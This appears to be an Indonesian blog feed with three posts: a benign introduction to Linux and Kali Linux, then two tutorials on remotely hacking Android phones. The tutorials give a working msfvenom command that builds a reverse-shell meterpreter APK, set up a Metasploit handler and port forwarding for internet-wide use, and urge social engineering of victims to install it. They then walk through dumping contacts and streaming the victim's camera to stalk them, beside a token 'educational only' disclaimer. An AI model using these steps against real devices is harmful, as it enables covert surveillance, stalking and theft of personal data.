+&lt;p&gt;Linux sendiri berarti Unix clone, kernel yang ditulis oleh Linus Torvalds dan dikembangkan dengan bantuan programer dan hackers dari seluruh dunia.&lt;/p&gt;
+
+&lt;p&gt;Linux memiliki semua feature yang dimiliki oleh Unix, termasuk multitasking, virtual memory, shared libraries, demand load, shared copy on write executables, proper memory management dan TCP/IP networking.&lt;/p&gt;
+
+&lt;p&gt;Dengan feature sekelas ‘real operating system’ tersebut tidak membuat Linux menjadi mahal harganya, justru Linux dapat diperoleh secara gratis. Kalaupun ada sedikit charge itu hanya sebagai ongkos distribusi atau pembelian cd belaka.&lt;/p&gt;
+
+&lt;p&gt;Linux di distribusikan dibawah GNU General Public License yaitu suatu lisensi dimana pemilik program tetap memegang hak ciptanya tetapi orang lain dimungkinkan menyebarkan, memodifikasi atau bahkan menjual kembali program tersebut tapi dengan syarat source code asli harus tetap disertakan dalam distribusinya.&lt;/p&gt;
+
+&lt;p&gt;Linux pertama kali dikembangkan untuk PC berbasis 386/486 dan kemudian dikembangkan juga untuk mesin-mesin lain.Hingga saat ini Linux juga berjalan di mesin DEC Alpha, SUN Sparcs, M68000,MIPS serta PowerPC.&lt;/p&gt;
+
+&lt;p&gt;Linux bisa berjalan hanya dengan 150Mb space hard disk,2 Mb RAM tapi secara realistis tentunya dibutuhkan ruang lagi untuk development tools, data dan sebagainya maka dibutuhkan sekitar 250Mb space HD dan 12-16Mb RAM.&lt;/p&gt;
+
+&lt;p&gt;Sebagai sistem operasi modern Linux mendukung banyak sekali hardware yang beredar di pasaran tapi beberapa memang tidak didukung karena masalah teknis atau sekelompok sukarelawan sedang sedang mengusahakan driver-nya. Untuk mengecek hardware apa saja yang bisa berjalan di bawah Linux silakan lihat hardware compability di Redhat.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;kelebihan-kali-linux&quot;&gt;Kelebihan Kali Linux&lt;/h2&gt;
+
+&lt;p&gt;Nah, setelah mengetahui pengertian dari Kali Linux, Selanjutnya anda wajib mengetahui tentang kelebihan Kali Linux berikut ini :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Stremaing Security serta update package dari repositori Debian&lt;/li&gt;
+  &lt;li&gt;Sinkronisasi dengan repositori Debian 4 kali sehari, terus memberikan Anda dengan update paket terbaru dan perbaikan keamanan yang tersedia.&lt;/li&gt;
+  &lt;li&gt;Packaging file Debian dari masing – masing tools Kali Linux&lt;/li&gt;
+  &lt;li&gt;Jadi tool-tool pada Kali linux bisa di gunakan oleh distro yang lain yang masih turunan dari linux Debian, seperti Ubuntu, Blankon, dll&lt;/li&gt;
+  &lt;li&gt;Pemaketan/packaging jangka panjang &amp;amp; sering maintenance pada bug-bug di tools-nya&lt;/li&gt;
+  &lt;li&gt;Bisa menggunakan banyak desktop evironment misal KDE, LXDE, XFCE&lt;/li&gt;
+  &lt;li&gt;Kemudahan update untuk versi kali linux terbaru&lt;/li&gt;
+  &lt;li&gt;Support jangka panjang pada pengembangan jangka panjang pada ARM Hardware&lt;/li&gt;
+  &lt;li&gt;Automatis Instalasi pada Kali&lt;/li&gt;
+  &lt;li&gt;Costum ISO &amp;amp; Boostraps&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Dan masih banyak yang lain , tetapi pada dasarnya Kali Linux adalah distro versi 6 dari Backtrack hanya saja di rubah namanya jadi so pasti akan ada kelebihan yang di berikan . Dari kelebihan ini, yang paling mencolok yaitu adanya support yang kuat dari Debian yang merupakan nenek moyang dari Kali Linux.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;kekurangan-kali-linux&quot;&gt;Kekurangan Kali Linux&lt;/h2&gt;
+
+&lt;p&gt;Kali Linux selain dengan segala kemudahannya karena open source, juga memiliki kekurangan. Yuk, simak kekurangan Kali Linux berikut ini :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sistem operasi Kali Linux sulit untuk dipelajari, terutama yang belum mempunyai
+kemampuan komputer sama sekali&lt;/li&gt;
+  &lt;li&gt;Belum banyak aplikasi yang mendukung Linux&lt;/li&gt;
+  &lt;li&gt;Tampilan dari sistem operasi ini kurang menarik&lt;/li&gt;
+  &lt;li&gt;Tidak banyak dukungan dari hardware-hardware tertentu&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;fitur--fitur-kali-linux&quot;&gt;Fitur – Fitur Kali Linux&lt;/h2&gt;
+
+&lt;p&gt;Di kali linux ini terdapat fitur fitur yang mungkin pada backtrack telah ada namun telah di sempurnakan oleh sang developer,berikut fitur fitur nya di bawah ini.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Terdapat 300 lebih alat penetration testing yang telah di sempurnakan.&lt;/li&gt;
+  &lt;li&gt;Gratis sampai kapan pun&lt;/li&gt;
+  &lt;li&gt;Open source git tree&lt;/li&gt;
+  &lt;li&gt;Mengikuti FHS complaint&lt;/li&gt;
+  &lt;li&gt;Dukungan perangkat wireless yang luas&lt;/li&gt;
+  &lt;li&gt;Modifikasi kernel yang sudah di patch untuk injection&lt;/li&gt;
+  &lt;li&gt;Lingkungan pengembang yang aman&lt;/li&gt;
+  &lt;li&gt;Mempunyai banyak bahasa&lt;/li&gt;
+  &lt;li&gt;Dapat di modifikasi sesuka hati&lt;/li&gt;
+  &lt;li&gt;Mendukung ARMEL dan ARMHF.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Kali Linux merupakan pembangunan kembali BackTrack Linux secara sempurna, mengikuti sepenuhnya kepada standar pengembangan Debian. Semua infrastruktur baru telah dimasukkan ke dalam satu tempat, semua tools telah direview dan dikemas, dan kami menggunakan Git untuk VCS nya.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;kesimpulan&quot;&gt;Kesimpulan&lt;/h2&gt;
+
+&lt;p&gt;Kali Linux merupakan sebuah system operasi berbasis debian linux yang cukup mudah digunakan oleh pemula. Bahkan, Kali linux ini bisa di gunakan oleh distro yang lain yang masih turunan dari linux Debian, seperti Ubuntu, Blankon.&lt;/p&gt;
+
+&lt;p&gt;Fitur – fitur Kali Linux sendiri juga beragam seperti mempunyai 300 lebih alat penetration testing, Gratis sampai kapan pun, Open source git tree, Mengikuti FHS complaint, hingga Dukungan perangkat wireless yang luas.&lt;/p&gt;
+
+&lt;p&gt;Nah, buat anda yang ingin belajar hacker sangat disarankan mengetahui definisi hingga fungsi dari Kali Linux. Karena biasanya setiap kernel dari kali linux sangat flexibel dan dapat beradaptasi dengan turunan linux lainnya.&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Bagi anda yang sudah terbiasa menggunakan windows, pasti masih asing dengan</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://docs.google.com/uc?export=download&amp;id=1aZMgHFuUbPPtYR1k6MSYB7u1b16NGL9u" /><media:content medium="image" url="https://docs.google.com/uc?export=download&amp;id=1aZMgHFuUbPPtYR1k6MSYB7u1b16NGL9u" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Peretasan Android Melalui internet</title><link href="http://localhost:4000/Meretas-ponsel-Android-Dengan-Internet" rel="alternate" type="text/html" title="Peretasan Android Melalui internet" /><published>2021-10-29T00:00:00+07:00</published><updated>2021-10-29T00:00:00+07:00</updated><id>http://localhost:4000/Meretas-ponsel-Android-Dengan-Internet</id><content type="html" xml:base="http://localhost:4000/Meretas-ponsel-Android-Dengan-Internet">&lt;p&gt;Jadi bagaimana jika kita ingin membuat peretasan bekerja di mana saja di dunia.&lt;!--more--&gt; Apa yang dapat kita lakukan untuk membuat peretasan global sehingga kita dapat meretas siapa pun melalui internet tanpa membeli server yang mahal?&lt;/p&gt;
+
+&lt;p&gt;Postingan ini lanjutan dari &lt;a href=&quot;https://daffadev.my.id/Meretas-ponsel-Android-dari-jarak-jauh-menggunakan-Metasploit&quot;&gt;- Hack ponsel Android dari jarak jauh&lt;/a&gt;, Wajib baca dahulu postingan awal, sebelum melanjutkan langkah-langkah dibawah.
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-1&quot;&gt;Langkah 1:&lt;/h2&gt;
+&lt;p&gt;Kita membutuhkan router yang dapat melakukan fitur port forwarding. Ini adalah suatu keharusan untuk meretas internet dengan Metasploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-2&quot;&gt;Langkah 2:&lt;/h2&gt;
+&lt;p&gt;Selanjutnya, kita memerlukan IP dinamis untuk msfvenom dan Metasploit agar dapat bekerja melalui internet, jadi buka &lt;a href=&quot;https://noip.com&quot;&gt;noip.com&lt;/a&gt; dan daftar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-256-min-1024x341.jpg&quot; alt=&quot;kali&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Klik Add Host dan masukkan nama apa saja untuk host tersebut. Klik simpan host.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-263-min-1024x460.jpg&quot; alt=&quot;kali-linix&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-3&quot;&gt;Langkah 3:&lt;/h2&gt;
+&lt;p&gt;Sekarang Unduh DUC dari situs web resmi atau &lt;a href=&quot;https://www.noip.com/download&quot;&gt;klik di sini&lt;/a&gt;. Instal klien DUC dan masuk ke akun Anda. Setelah Anda melakukan alamat IP untuk sistem Anda secara otomatis akan diperbarui dalam DNS. Jika ini tidak terjadi, Anda dapat mengkonfigurasi DNS secara manual.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-262-min.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-4&quot;&gt;Langkah 4:&lt;/h2&gt;
+&lt;p&gt;Klik tambahkan host pada klien DUC seperti yang ditunjukkan. Jika dilakukan dengan benar, Anda akan mendapatkan ketiga centang hijau.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-257-min.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Set host yang sebenarnya.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-258-min.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Semua pengaturan sudah diatur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-259-min.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-5&quot;&gt;Langkah 5:&lt;/h2&gt;
+&lt;p&gt;Sekarang, kita memerlukan IP gateway untuk port forward dari pengaturan router kita. Jadi ketik &lt;b&gt;“ifconfig”&lt;/b&gt; di command prompt, dan Anda akan mendapatkan IP gateway.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-6&quot;&gt;Langkah 6:&lt;/h2&gt;
+&lt;p&gt;Sekarang buka browser apa pun yang Anda miliki dan rekatkan IP gateway di sana. Ini akan meminta halaman login. Masukkan nama pengguna dan kata sandi router Anda (secara default keduanya adalah admin untuk sebagian besar router).&lt;/p&gt;
+
+&lt;h2 id=&quot;langkah-8&quot;&gt;Langkah 8:&lt;/h2&gt;
+&lt;p&gt;Sekarang arahkan ke opsi penerusan porta. Tergantung pada merek router, halaman mungkin berada di lokasi yang berbeda, tetapi prinsip dasarnya sama.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/06/Screenshot-46.png&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-9&quot;&gt;Langkah 9:&lt;/h2&gt;
+&lt;p&gt;Klik Add Port dan beri nilai Add port 2222 lagi dan simpan. Anda dapat memasukkan nomor port yang Anda inginkan.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-10&quot;&gt;Langkah 10:&lt;/h2&gt;
+&lt;p&gt;Sekarang, saat mengatur dua perintah alih-alih IP lokal saya, gunakan ddns yang baru saja Anda buat tanpa IP.&lt;/p&gt;
+
+&lt;p&gt;Jadi dalam kasus saya, itu akan menjadi nightfury007.dns.net bukannya 192.168.78.129&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/06/m1.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kamu juga akan menemukan beberapa perintah jaringan termasuk portfwd dan route
+&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/06/m5.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-11&quot;&gt;Langkah 11:&lt;/h2&gt;
+&lt;p&gt;Sekarang, sisa metodenya sama. Anda harus menggunakan rekayasa sosial untuk membuat korban menginstal APK di perangkat mereka. Bagian ini adalah sesuatu yang harus Anda lakukan sendiri. Terserah kreativitas Anda.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-12&quot;&gt;Langkah 12:&lt;/h2&gt;
+&lt;p&gt;Anda telah berhasil meretas ponsel korban segera setelah mereka menginstal dan membukanya.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-13&quot;&gt;Langkah 13:&lt;/h2&gt;
+&lt;p&gt;Anda tidak perlu menggunakan NOIP sebagai ganti alamat IP publik Anda saat membuat apk dan menyiapkan Metasploit. Namun masalahnya adalah alamat IP publik yang kadang-kadang berubah, sehingga penggunaan IP publik akan menjadi solusi sementara.&lt;/p&gt;
+
+&lt;h3 id=&quot;cari-di-google-whatsmyip-untuk-menemukan-alamat-ip-publik-anda&quot;&gt;Cari di google “whatsmyIP” untuk menemukan alamat IP publik Anda&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://myhackingworld.com/wp-content/uploads/2019/08/Screenshot-291.jpg&quot; alt=&quot;noip&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;langkah-14&quot;&gt;Langkah 14:&lt;/h2&gt;
+&lt;p&gt;Jika Anda mengalami masalah dengan klien tanpa IP. Jangan gunakan sebaliknya, langsung gunakan IP publik Anda. Penerusan port diperlukan secara default pada semua metode peretasan melalui internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;pertanyaan-umum-tentang-peretasan-dengan-metasploit-dan-msfvenom&quot;&gt;Pertanyaan umum tentang peretasan dengan Metasploit dan msfvenom.&lt;/h3&gt;
+
+&lt;h3 id=&quot;q1-apakah-alat-peretasan-metasploit-dan-msfvenom-ini-legal&quot;&gt;Q.1 Apakah alat peretasan Metasploit dan msfvenom ini legal?&lt;/h3&gt;
+&lt;p&gt;&lt;b&gt;Tidak.&lt;/b&gt; Ini tidak dimaksudkan untuk meretas orang. Ini adalah alat yang dimaksudkan untuk &lt;b&gt;pentesting WhiteHat&lt;/b&gt; saja dan harus digunakan dengan maksud yang sama. Kami(&lt;a href=&quot;https://daffadev.my.id/&quot;&gt;DaffaDev&lt;/a&gt;) tidak bertanggung jawab apapun yang Anda lakukan atas penggunaan ilegal.&lt;/p&gt;
+
+&lt;h3 id=&quot;q2-tidak-berfungsi-apa-yang-harus-saya-lakukan&quot;&gt;Q.2 Tidak berfungsi apa yang harus saya lakukan?&lt;/h3&gt;
+&lt;p&gt;Nonaktifkan firewall dan antivirus dan kemudian semua langkah lagi. Pastikan Anda tidak membuat kesalahan pengetikan saat mengetik perintah.&lt;/p&gt;
+
+&lt;h3 id=&quot;q3-antivirus-saya-mendeteksinya-sebagai-virus-apakah-aman&quot;&gt;Q.3 Antivirus saya mendeteksinya sebagai virus apakah aman?&lt;/h3&gt;
+&lt;p&gt;File apk yang dibuat oleh msfvenom adalah virus yang dibuat oleh Anda jadi jelas kecuali Anda menggunakan aplikasi seperti kerangka cadar itu akan terdeteksi sebagai virus.&lt;/p&gt;
+
+&lt;h3 id=&quot;q4-saya-ingin-meretas-ponsel-pacar-saya-bagaimana-caranya&quot;&gt;Q.4 Saya ingin meretas ponsel pacar saya bagaimana caranya?&lt;/h3&gt;
+&lt;p&gt;Kami tidak mendukung peretasan &lt;b&gt;BlackHat&lt;/b&gt;, dan kami tidak membalas dan menanggapi permintaan tersebut. Artikel ini dimaksudkan hanya untuk tujuan pendidikan.&lt;/p&gt;
+
+&lt;h3 id=&quot;q5-dapatkah-saya-menggunakan-kali-linux-dengan-di-ponsel-saya-untuk-menggunakan-hack-ini&quot;&gt;Q.5 Dapatkah saya menggunakan kali Linux dengan di ponsel saya untuk menggunakan hack ini?&lt;/h3&gt;
+&lt;p&gt;&lt;b&gt;Ya&lt;/b&gt;, Anda dapat menggunakan aplikasi termux, atau Anda dapat menggunakan nethunter kali Linux untuk meretas perangkat android dengan Metasploit dan msfvenom.&lt;/p&gt;
+
+&lt;h3 id=&quot;q6-saya-tidak-ingin-menggunakan-noip&quot;&gt;Q.6 Saya tidak ingin menggunakan NOIP?&lt;/h3&gt;
+&lt;p&gt;Anda dapat langsung menggunakan alamat IP publik Anda.&lt;/p&gt;
+
+&lt;h3 id=&quot;q7-apa-perbedaan-antara-alamat-ip-publik-dan-lokal&quot;&gt;Q.7 Apa perbedaan antara alamat IP publik dan lokal?&lt;/h3&gt;
+&lt;p&gt;IP publik adalah alamat yang Anda miliki di internet. Anda bisa google whatsmyIP untuk mengetahui IP publik Anda. IP lokal Anda adalah alamat IP sistem Anda di jaringan lokal. Gunakan ifconfig untuk Linux dan ipconfig untuk windows untuk mengetahui IP Anda.&lt;/p&gt;</content><author><name>x1666</name></author><category term="Linux" /><summary type="html">Jadi bagaimana jika kita ingin membuat peretasan bekerja di mana saja di dunia.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lh3.googleusercontent.com/-RNf9ZQP6yfk/YYiVoZem3lI/AAAAAAAAHe0/xJRPX4jaRWgj5uPsien2p2ispgB7PJ-fQCLcBGAsYHQ/metasploit.webp" /><media:content medium="image" url="https://lh3.googleusercontent.com/-RNf9ZQP6yfk/YYiVoZem3lI/AAAAAAAAHe0/xJRPX4jaRWgj5uPsien2p2ispgB7PJ-fQCLcBGAsYHQ/metasploit.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack ponsel Android dari jarak jauh</title><link href="http://localhost:4000/Meretas-ponsel-Android-dari-jarak-jauh-menggunakan-Metasploit" rel="alternate" type="text/html" title="Hack ponsel Android dari jarak jauh" /><published>2021-10-12T00:00:00+07:00</published><updated>2021-10-12T00:00:00+07:00</updated><id>http://localhost:4000/Meretas-ponsel%20Android-dari-jarak-jauh%20menggunakan-Metasploit</id><content type="html" xml:base="http://localhost:4000/Meretas-ponsel-Android-dari-jarak-jauh-menggunakan-Metasploit">&lt;p&gt;Kita akan menggunakan msfvenom untuk membuat payload dan&lt;!--more--&gt; menyimpannya sebagai file apk. Setelah menghasilkan payload, kita perlu menyiapkan listener ke framework Metasploit. Setelah target mengunduh dan menginstal apk jahat, penyerang dapat dengan mudah mendapatkan kembali sesi meterpreter di Metasploit. Penyerang perlu melakukan beberapa rekayasa sosial untuk menginstal apk di perangkat seluler korban.&lt;/p&gt;
+
+&lt;h2 id=&quot;tutorial-langkah-demi-langkah&quot;&gt;Tutorial langkah demi langkah&lt;/h2&gt;
+
+&lt;h3 id=&quot;menghasilkan-payload-dengan-msfvenom&quot;&gt;Menghasilkan Payload dengan msfvenom&lt;/h3&gt;
+
+&lt;p&gt;Pertama, jalankan Kali Linux sehingga kita dapat menghasilkan file apk sebagai aplikasi berbahaya. Kita perlu memeriksa IP publik kita yang ternyata ‘192.168.0.112’. Kamu juga dapat meretas perangkat Android melalui Internet dengan menggunakan IP Publik/Eksternal kamu di LHOST dan dengan port forwarding.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/kali.png&quot; alt=&quot;kali&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah mendapatkan IP host publik Anda, gunakan alat msfvenom yang akan menghasilkan payload untuk menembus perangkat Android. Ketik perintah:&lt;/p&gt;
+&lt;pre&gt;
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R &amp;gt; ehacking.apk
+&lt;/pre&gt;
+&lt;h2 id=&quot;dimana&quot;&gt;Dimana:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;b&gt;-p&lt;/b&gt; menunjukkan jenis payload.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;android/meterpreter/reverse_tcp&lt;/b&gt; menentukan shell meterpreter terbalik akan datang dari perangkat Android target.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;LHOST&lt;/b&gt; adalah &lt;b&gt;IP Publik&lt;/b&gt; Kamu.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;LPORT&lt;/b&gt; diatur sebagai listening port.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;R&amp;gt; /var/www/html&lt;/b&gt; akan memberikan output langsung di server Apache.&lt;/li&gt;
+  &lt;li&gt;&lt;b&gt;apk&lt;/b&gt; adalah nama akhir dari hasil akhir.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ini akan memakan waktu untuk menghasilkan file apk hampir sepuluh ribu byte.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/kali2.png&quot; alt=&quot;kali-linix&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;meluncurkan-serangan&quot;&gt;Meluncurkan Serangan&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/kali3.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Semua tampaknya sudah siap, sekarang jalankan &lt;b&gt;msfconsole&lt;/b&gt;. Gunakan &lt;b&gt;exploit multi/handler&lt;/b&gt;, atur &lt;b&gt;payload&lt;/b&gt; sama seperti yang dihasilkan sebelumnya, atur nilai &lt;b&gt;LHOST&lt;/b&gt; dan &amp;lt;p&amp;gt;LPORT&amp;lt;/p&amp;gt; sama seperti yang digunakan dalam payload dan terakhir ketik &lt;b&gt;exploit&lt;/b&gt; untuk meluncurkan serangan.
+&lt;img src=&quot;/images/kali4.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dalam skenario kehidupan nyata, beberapa teknik rekayasa sosial dapat digunakan untuk membiarkan target mengunduh file apk berbahaya. Untuk demonstrasi kita hanya tinggal mengakses mesin penyerang untuk mengunduh file di perangkat Android.
+&lt;img src=&quot;/images/kali5.jpg&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah berhasil mengunduhnya, pilih aplikasi yang akan diinstal.&lt;/p&gt;
+
+&lt;p&gt;Sejauh ini, opsi penginstallan sering terlihat ketika kita mencoba menginstal beberapa aplikasi pihak ketiga dan biasanya pengguna tidak akan ragu untuk mengizinkan instalasi dari sumber yang tidak dikenal.
+&lt;img src=&quot;/images/kali6.jpg&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah pengguna menginstal aplikasi dan menjalankannya, sesi &lt;b&gt;meterepreter&lt;/b&gt; akan segera dibuka di sisi penyerang.
+&lt;img src=&quot;/images/kali7.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+    &lt;!-- DaffaDev --&gt;
+&lt;ins class=&quot;adsbygoogle iklan-artikel&quot; style=&quot;display:block&quot; data-ad-client=&quot;ca-pub-1171588080744378&quot; data-ad-slot=&quot;8699873320&quot; data-ad-format=&quot;auto&quot; data-full-width-responsive=&quot;true&quot;&gt;&lt;/ins&gt;
+&lt;script&gt;
+     (adsbygoogle = window.adsbygoogle || []).push({});
+&lt;/script&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;post-exploitation&quot;&gt;Post Exploitation&lt;/h1&gt;
+
+&lt;p&gt;Ketik &lt;b&gt;“background”&lt;/b&gt; dan kemudian &lt;b&gt;“sessions”&lt;/b&gt; untuk membuat daftar semua sesi dari mana Anda dapat melihat semua IP yang terhubung ke mesin.
+&lt;img src=&quot;/images/kali8.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kamu dapat berinteraksi dengan sesi apa pun dengan mengetik &lt;b&gt;sessions -i [session ID]&lt;/b&gt;
+Setelah memasuki sesi, ketik &lt;b&gt;“help”&lt;/b&gt; untuk membuat daftar semua perintah yang dapat kita ajukan di sesi ini.&lt;/p&gt;
+
+&lt;p&gt;Kamu dapat melihat beberapa perintah sistem file yang berguna saat Anda mencoba mencari beberapa informasi atau data sensitif. Dengan menggunakan ini, Kamu dapat dengan mudah mengunduh atau mengunggah file atau informasi apa pun
+&lt;img src=&quot;/images/kali9.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kamu juga akan menemukan beberapa perintah jaringan termasuk portfwd dan route
+&lt;img src=&quot;/images/kali10.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Beberapa perintah sistem yang kuat untuk mendapatkan ID pengguna, mendapatkan shell atau mendapatkan informasi sistem yang lengkap.&lt;/p&gt;
+
+&lt;p&gt;Ketik “app_list” dan itu akan menampilkan semua aplikasi yang diinstal pada perangkat.
+&lt;img src=&quot;/images/kali11.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kita juga memiliki kekuatan untuk mencopot pemasangan aplikasi apa pun dari perangkat Android.
+&lt;img src=&quot;/images/kali12.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;mengekstrak-kontak-dari-perangkat-android&quot;&gt;Mengekstrak Kontak dari Perangkat Android&lt;/h1&gt;
+
+&lt;p&gt;Sekarang kita ekstrak beberapa kontak dari perangkat target dengan mengetik “dump” dan tab ganda
+&lt;img src=&quot;/images/kali13.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ini akan menampilkan semua opsi untuk mengekstrak dari perangkat. Ketik “dump_contacts” dan enter
+&lt;img src=&quot;/images/kali14.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ini akan mengekstrak semua kontak dari perangkat Android dan akan menyimpannya di direktori lokal kita. Untuk melihat file ini ketik “ls” dan “cat [file_name]”
+&lt;img src=&quot;/images/kali15.png&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ini akan menunjukkan konten file kontak yang sebelumnya diunduh dari perangkat target. Informasi ini sangat sensitif dan dapat dimanfaatkan oleh peretas.&lt;/p&gt;
+
+&lt;h1 id=&quot;mengendalikan-kamera-android&quot;&gt;Mengendalikan Kamera Android&lt;/h1&gt;
+
+&lt;p&gt;Dengan mengetik perintah &lt;b&gt;“webcam_stream”&lt;/b&gt; kamu bisa menyusup dan mengamati melalui kamera android si korban, dan menguntitnya.
+&lt;img src=&quot;/images/kali16.webp&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;waspada-android-terbaru-pun-masih-lancar-terkena-serangan&quot;&gt;Waspada… Android Terbaru pun Masih Lancar Terkena Serangan.&lt;/h1&gt;
+
+&lt;p&gt;Handphone xiaomi MI10 dengan OS Android 10 Masih Lancar terkena serangan, Untuk kamu yang masih sering klik website tidak jelas yang masuk ke sms atau via whatsapp sebaiknya berhati-hati dari sanalah aplikasi ini terinstall diam-diam di android kamu.
+&lt;img src=&quot;/images/kali17.webp&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/kali18.webp&quot; alt=&quot;kali-linux&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ada masih banyak lagi perintah yang tersedia di &lt;b&gt;meterpreter&lt;/b&gt;. Lebih lanjut coba jelajahi dan pelajari apa yang bisa kita lakukan dengan perangkat Android. Ini menyimpulkan bahwa kita telah berhasil menembus perangkat Android menggunakan Kali Linux dan Metasploit-Framework.&lt;/p&gt;
+
